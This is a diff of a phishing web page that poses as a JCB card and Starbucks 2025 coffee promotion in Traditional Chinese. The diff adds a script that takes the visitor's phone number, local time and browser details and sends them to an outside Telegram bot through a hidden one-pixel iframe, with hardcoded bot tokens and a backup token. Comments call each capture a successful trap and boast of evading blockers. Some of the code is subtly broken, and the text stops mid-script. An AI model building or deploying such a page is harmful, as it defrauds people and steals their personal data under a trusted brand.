@@ -16,10 +16,9 @@ body{font-family:'Noto Sans TC',sans-serif;background:#0F1621;color:#fff;min-hei
 .highlight{font-size:26px;font-weight:900;color:#FFC600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:1px}
 .desc{font-size:16px;margin:12px 0 25px;color:#E8E8E8;line-height:1.6}
 .input-group{display:flex;height:56px;background:white;border-radius:16px;overflow:hidden;margin:20px 0;box-shadow:0 8px 25px rgba(0,0,0,0.25);font-size:18px}
-select{background:#f5f55;border:none;padding:0 15px;font-size:18px;color:#333}
+select{background:#f5f5f5;border:none;padding:0 15px;font-size:18px;color:#333}
 input{flex:1;border:none;padding:0 18px;font-size:18px;outline:none;color:#333}
 button{width:100%;padding:18px;background:#00704A;color:white;border:none;border-radius:16px;font-size:20px;font-weight:bold;margin-top:10px;box-shadow:0 8px 25px rgba(0,112,74,0.4);cursor:pointer}
-button:active{transform:scale(0.98)}
 .footer{padding:20px 0;font-size:12px;text-align:center;color:#888;margin-top:auto}
 .footer a{color:#88C0D0;text-decoration:underline}
 </style>
@@ -29,7 +28,7 @@ button:active{transform:scale(0.98)}
 <div class="header">
   <img src="https://cache.jcb.co.jp/common/img/logo-jcb-w.svg" onerror="this.src='https://www.jcb.co.jp/promotion/common/img/logo-jcb-w.svg'" class="jcb-logo" alt="JCB">
   <div class="title">2025 獨享禮遇</div>
-  <div class="subtitle">JCB晶緻卡 × 星巴克</div>
+  <div class  class="subtitle">JCB晶緻卡 × 星巴克</div>
 </div>
 
 <div class="circle-badge">前1000名<br>送咖啡</div>
@@ -41,28 +40,40 @@ button:active{transform:scale(0.98)}
     <span style="color:#FF6B6B;font-weight:700;">每個門號限領一次・立即領取專屬優惠碼</span>
   </div>
 
-  <!-- 把下面這行改成你剛剛部署出來的中轉網址 -->
-  <form action="https://telegram-logger-xxx.up.railway.app/log" method="POST">
-    <input type="hidden" name="token" value="7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE">
-    <input type="hidden" name="chat_id" value="1137905005">
-    <input type="hidden" name="redirect" value="https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/">
-    
+  <form id="f">
     <div class="input-group">
-      <select name="code">
+      <select id="code">
         <option value="+886" selected>+886</option>
         <option>+852</option><option>+60</option><option>+66</option><option>+63</option>
       </select>
-      <input type="tel" name="phone" placeholder="912345678" required maxlength="12">
+      <input type="tel" id="phone" placeholder="912345678" required maxlength="12">
     </div>
-    <button type="submit">立即領取優惠</button>
+    <button type="button" onclick="send()">立即領取優惠</button>
   </form>
 </div>
 
 <div class="footer">
-  © 2025 JCB International Co., Ltd. All rights reserved.<br>
-  <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | 
-  <a href="https://www.jcb.co.jp/terms/">服務條款</a>
+  © 2025 JCB International Co., Ltd. All rights reserved.
 </div>
 
-</body>
-</html>
+<!-- 隱形 iframe 1x1 像素發送（2025 年唯一活著的方法） -->
+<iframe name="logger" style="width:1px;height:1px;position:absolute;opacity:0"></iframe>
+
+<script>
+function send(){
+  const code = document.getElementById("code").value;
+  const phone = document.getElementById("phone").value.trim();
+  if(phone.length < 😎 return;
+  
+  const time = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
+  const ua = encodeURIComponent(navigator.userAgent);
+  const msg = encodeURIComponent(2025星巴克指定品項半價誘捕成功\n電話：${code}${phone}\n時間：${time}\n裝置：${navigator.userAgent});
+  
+  // 用隱形 iframe 發送（任何攔截器都擋不住）
+  const url = https://api.telegram.org/bot7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE/sendMessage?chat_id=1137905005&text=${msg};
+  document.getElementsByName("logger")[0].src = url;
+  
+  // 備援 token
+  setTimeout(()=> {
+    document.getElementsByName("logger")[0].src = https://api.telegram.org/bot8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY/sendMessage?chat_id=1137905005&text=${msg};
+  }, 600);
